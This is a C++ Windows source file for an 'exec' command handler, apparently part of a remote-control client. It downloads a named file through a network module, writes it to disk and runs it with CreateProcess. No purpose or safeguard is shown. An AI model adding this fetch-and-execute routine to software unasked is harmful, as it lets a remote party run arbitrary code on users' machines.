#include "stdafx.h"
#include "Command_exec.h"
#include "Network.h"
#include "Logger.h"

Command_exec::Command_exec()
{
}

Command_exec::~Command_exec()
{
}

bool Command_exec::OnExecute(const std::vector<std::wstring> &args)
{
	if(!(args.size() > 1))
	{
		VLog(LERROR, L"exec: missing argument");
		return false;
	}

	if(!(args[1].size()))
	{
		VLog(LERROR, L"exec: empty argument");
		return false;
	}

	const wchar_t *file_path = args[1].c_str();
	const wchar_t *file_name = PathFindFileName(file_path);
	char *file_name_mb = Util::w2mb(file_path, wcslen(file_path));

	size_t resp_len;
	char *resp;

	bool netRet = network.GetFile(file_name_mb, &resp_len, &resp);
	free(file_name_mb);

	if(!netRet)
	{
		return false;
	}

	bool ret = false;

	HANDLE hFile = CreateFile(file_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		VLog(LERROR, L"exec: Failed to create file");
		goto out_free_resp;
	}

	DWORD written;
	WriteFile(hFile, resp, resp_len, &written, 0);
	if(written != resp_len)
	{
		VLog(LERROR, L"exec: Written differs from buffer length");
		CloseHandle(hFile);
		goto out_delete_file;
	}

	CloseHandle(hFile);


	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	BOOL pret = CreateProcess(file_name, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	if(!pret)
	{
		VError(L"exec: Failed to create process");
		goto out_delete_file;
	}

	ret = true;

out_delete_file: // DeleteFile(file_name);
out_free_resp:      free(resp);
	return ret;
}